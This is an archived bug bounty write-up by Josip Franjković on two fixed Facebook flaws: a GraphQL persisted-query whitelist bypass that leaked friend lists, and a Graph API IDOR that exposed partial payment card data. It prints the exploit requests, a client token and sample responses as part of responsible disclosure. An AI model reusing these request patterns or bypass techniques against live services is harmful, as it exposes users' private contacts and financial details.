---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-03-09_getting-any-facebook-users-friend-list-and-partial-payment-card-details.md
original_filename: 2018-03-09_getting-any-facebook-users-friend-list-and-partial-payment-card-details.md
title: Getting any Facebook user's friend list and partial payment card details
category: documents
detected_topics:
- idor
- xss
- command-injection
- otp
- graphql
- csrf
tags:
- imported
- documents
- idor
- xss
- command-injection
- otp
- graphql
- csrf
language: en
raw_sha256: d7b3a1657a13e7cdb64b6e1d72035932096c57df1eda3e8ce4ff00825bfec7e3
text_sha256: be368d8eed3954e702b4ef0f24967a3135fda02c8275486bc3208ad6ad59c377
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Getting any Facebook user's friend list and partial payment card details

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-03-09_getting-any-facebook-users-friend-list-and-partial-payment-card-details.md
- Source Type: markdown
- Detected Topics: idor, xss, command-injection, otp, graphql, csrf
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `d7b3a1657a13e7cdb64b6e1d72035932096c57df1eda3e8ce4ff00825bfec7e3`
- Text SHA256: `be368d8eed3954e702b4ef0f24967a3135fda02c8275486bc3208ad6ad59c377`


## Content

---
title: "Getting any Facebook user's friend list and partial payment card details"
page_title: "Getting any Facebook user's friend list and partial payment card details -  Josip Franjković"
url: "https://www.josipfranjkovic.com/blog/facebook-friendlist-paymentcard-leak"
final_url: "https://www.josipfranjkovic.com/blog/facebook-friendlist-paymentcard-leak"
authors: ["Josip Franjkovic (@josipfranjkovic)"]
programs: ["Meta / Facebook"]
bugs: ["Information disclosure", "IDOR"]
publication_date: "2018-03-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5953
---

#  [ Josip Franjković web security consultant ](/)

[Blog](/)

Bug bounties

##  Getting any Facebook user's friend list and partial payment card details 

written on March 9th, 2018

### Friend list disclosure using persisted GraphQL queries and first-party application client tokens

Facebook has a GraphQL endpoint which can only be used by some of their own first-party applications. Generally, you need a user (or page) access_token to query the GraphQL endpoint. I have decided to try using Facebook for Android application's **client** token, but the endpoint returned an error message: 
  
  
  graph.facebook.com/graphql?access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&q=me(){id}
  
  Response:
  ...
  "error_data": {
  "debug_info": "Only whitelisted query IDs are allowed in logged out context"
  },
  ...
  

I did not send a persisted query, but the error shows only whitelisted persisted queries are allowed. Since I collect Facebook's persisted GraphQL queries, I've decided to run a bunch of them to see if any are whitelisted. For example, the query "FBActorNameQuery": 
  
  
  graph.facebook.com/graphql?access_token=350685531728|62f8ce9f74b12f84c123cc23437&**query_id** =10154057467378380&query_params={"actorID":"100…."}
  
  Response:
  ...
  "error_data": {
  "debug_info": "Only whitelisted query IDs are allowed in logged out context"
  },
  ...
  

Unfortunately, I could not find a single whitelisted one - the error was always the same. A couple hours later I remembered another way to send persisted queries, using **doc_id** as the query ID - these did not return the error, but in most cases they returned public data only. While this is a whitelist bypass, it mostly returned data which is already public. However, a query named "**CSPlaygroundGraphQLFriendsQuery** " leaked the friend list regardless of the privacy settings. Example request and response: 
  
  
  graph.facebook.com/graphql?access_token=350685531728|62f8ce9f74b12f84c123cc23437&**doc_id** =1914123128613545&variables={"**user_id** ":"10000xxxxxxxx"}&method=post
  
  Response:
  ...
  "node": {
  "friends": {
  "edges": [
  "node": {
  "id": "12xxxxxxxxx",
  "name": "Some One",
  },
  {
  "node": {
  "id": "15xxxxxxxxx",
  "name": "Another One",
  }
  },
  ...
  

#### Timeline

  * 6th of October, 2017: Bug reported 

  * 12th of October, 2017: Response from Facebook, bug is triaged 

  * 14th of October, 2017: Friendlist leak is fixed 

  * 17th of October, 2017: Whitelist bypass is fixed 

### Partial payment card details leak using Graph API

A bug existed in Facebook's Graph API that allowed querying for any user's payment cards details using a field named payment_modules_options. I found out about this field by intercepting all the requests made by Facebook's Android application during registration and login flow.  
Here is an example request: 
  
  
  graph.facebook.com/v2.8/**USER_ID**?access_token=**TOKEN**
  &fields=payment_modules_options.payment_type(payment_settings)
  

USER_ID is the id of victim's Facebook account, and TOKEN is the attacker's access_token from a first-party Facebook application, like their Android app. The query doesn’t work without a valid payment_type, but specifying an invalid one, payment_type(asd) returned the list of all possible payment types. This is a textbook example of an insecure direct object reference bug (IDOR). 

Screenshot of the request and response using my account as the victim: ![Cards leak](/resources/img/pcleak.png) As you can see, the returned data included: 

  * first 6 card digits (BIN), identifies the bank that issued the card

  * last 4 digits

  * expiry month and year

  * card type

  * cardholder first name

  * zip code and country

#### Timeline

  * 23rd of February, 2017, **21:11** \- Bug reported

  * 23rd of February, 2017, 21:50 - First response from Facebook, investigating the report

  * 23rd of February, 2017, 23:25 - Fix is being deployed

  * 24th of February, 2017, **01:24** \- Bug is now fixed

It took Facebook's team 4 hours and 13 minutes to fix the issue - the fastest report-to-fix for me. Thanks [@phwd](https://twitter.com/phwd) for proof-reading this blog post.

##### Random blog post

Bug bounties 

####  Stealing Facebook access_tokens using CSRF in device login flow 

written on July 19th, 2016

[ Read more ](/blog/hacking-facebook-csrf-device-login-flow)

![Josip Franjković](/resources/img/josip-franjkovic.jpg)

##### Josip Franjković

###### web security consultant

I enjoy breaking websites and participating in various bug bounty programs. 

##### You can contact me using:

  * [@JosipFranjkovic](https://twitter.com/josipfranjkovic) (DM open to everyone) 
  * [[email protected]](/cdn-cgi/l/email-protection#cfa5a0bca6bfe1a9bdaea1a5a4a0b9a6ac8fa8a2aea6a3e1aca0a2)
  * [keybase.io/josipfranjkovic](https://keybase.io/josipfranjkovic)

All rights reserved © 2018.  
— Josip Franjković
